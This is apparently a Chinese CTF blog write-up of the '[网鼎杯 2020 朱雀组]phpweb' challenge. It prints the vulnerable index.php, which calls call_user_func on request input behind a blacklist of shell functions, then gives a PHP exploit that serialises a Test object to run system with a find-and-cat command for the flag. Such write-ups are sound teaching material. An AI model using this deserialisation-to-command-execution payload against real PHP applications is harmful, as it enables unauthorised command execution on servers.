# 原创
：  [网鼎杯 2020 朱雀组]phpweb

# [网鼎杯 2020 朱雀组]phpweb

#### [网鼎杯 2020 朱雀组]phpweb

## 考点

> 
PHP反序列化


## 思路

> 
抓包发现可以php代码执行



## Payload

> 
方法一


```
index.php源码

&lt;!DOCTYPE html&gt;
&lt;html&gt;
&lt;head&gt;
    &lt;title&gt;phpweb&lt;/title&gt;
    &lt;style type="text/css"&gt;
        body {
            background: url("bg.jpg") no-repeat;
            background-size: 100%;
        }
        p {
            color: white;
        }
    &lt;/style&gt;
&lt;/head&gt;

&lt;body&gt;
&lt;script language=javascript&gt;
    setTimeout("document.form1.submit()",5000)
&lt;/script&gt;
&lt;p&gt;
    &lt;?php
    $disable_fun = array("exec","shell_exec","system","passthru","proc_open","show_source","phpinfo","popen","dl","eval","proc_terminate","touch","escapeshellcmd","escapeshellarg","assert","substr_replace","call_user_func_array","call_user_func","array_filter", "array_walk",  "array_map","registregister_shutdown_function","register_tick_function","filter_var", "filter_var_array", "uasort", "uksort", "array_reduce","array_walk", "array_walk_recursive","pcntl_exec","fopen","fwrite","file_put_contents");
    function gettime($func, $p) {
        $result = call_user_func($func, $p);
        $a= gettype($result);
        if ($a == "string") {
            return $result;
        } else {return "";}
    }
    class Test {
        var $p = "Y-m-d h:i:s a";
        var $func = "date";
        function __destruct() {
            if ($this-&gt;func != "") {
                echo gettime($this-&gt;func, $this-&gt;p);
            }
        }
    }
    $func = $_REQUEST["func"];
    $p = $_REQUEST["p"];

    if ($func != null) {
        $func = strtolower($func);
        if (!in_array($func,$disable_fun)) {
            echo gettime($func, $p);
        }else {
            die("Hacker...");
        }
    }
    ?&gt;
&lt;/p&gt;
&lt;form  id=form1 name=form1 action="index.php" method=post&gt;
    &lt;input type=hidden id=func name=func value='date'&gt;
    &lt;input type=hidden id=p name=p value='Y-m-d h:i:s a'&gt;
&lt;/body&gt;
&lt;/html&gt;

```

> 
其中的class，没有对参数进行验证，可以进行绕过


```
function gettime($func, $p) {
        $result = call_user_func($func, $p);
        $a= gettype($result);
        if ($a == "string") {
            return $result;
        } else {return "";}
    }


    class Test {
        var $p = "Y-m-d h:i:s a";
        var $func = "date";
        function __destruct() {
            if ($this-&gt;func != "") {
                echo gettime($this-&gt;func, $this-&gt;p);
            }
        }
    }

```

```
exp.php

&lt;?php 
function gettime($func, $p) {
    $result = call_user_func($func, $p);
    $a= gettype($result);
    if ($a == "string") {
        return $result;
    }
}
class Test {
    var $p = "cat $(find / -name flag*)";
    var $func = "system";
    function __destruct() {
        if ($this-&gt;func != "") {
            echo gettime($this-&gt;func, $this-&gt;p);
        }
    }
}

echo (serialize(new Test()));
?&gt;

```

<img alt="在这里插入图片描述" src="https://img-blog.csdnimg.cn/20210525235209992.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0xZSjIwMDEwNzI4,size_16,color_FFFFFF,t_70#pic_center"/><br/> <img alt="在这里插入图片描述" src="https://img-blog.csdnimg.cn/20210525235218499.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0xZSjIwMDEwNzI4,size_16,color_FFFFFF,t_70#pic_center"/>

> 
方法二


<img alt="在这里插入图片描述" src="https://img-blog.csdnimg.cn/20210525235235785.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0xZSjIwMDEwNzI4,size_16,color_FFFFFF,t_70#pic_center"/><br/> <img alt="在这里插入图片描述" src="https://img-blog.csdnimg.cn/20210525235241863.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0xZSjIwMDEwNzI4,size_16,color_FFFFFF,t_70#pic_center"/>
